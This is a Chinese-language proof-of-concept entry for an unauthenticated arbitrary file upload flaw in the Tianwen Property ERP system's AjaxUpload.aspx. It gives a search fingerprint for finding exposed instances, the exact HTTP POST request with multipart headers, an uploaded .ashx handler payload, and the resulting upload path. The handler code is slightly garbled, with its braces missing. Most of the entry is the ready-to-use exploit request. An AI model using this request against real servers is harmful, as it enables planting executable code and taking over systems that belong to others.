# 天问物业ERP系统AjaxUpload.aspx前台任意文件上传漏洞

- **系统**：天问物业ERP系统AjaxUpload.aspx前台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="国家版权局软著登字第1205328号"`
- **请求**：`POST /HM/M_Main/AjaxUpload.aspx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 487`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="UpFileData"; filename="1.ashx"
<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
public class AverageHandler : IHttpHandler
public bool IsReusable
get {
return true;
public void ProcessRequest(HttpContext ctx)
ctx.Response.Write("hello");
--00content0boundary00--

上传文件位置
http://xx.xx.xx.xx/HM/M_Main/UploadFiles/PersonAdjunct/2023/08/202382894343759.ashx
```

**其他**
- 天问物业ERP系统AjaxUpload.aspx前台任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 天问物业ERP系统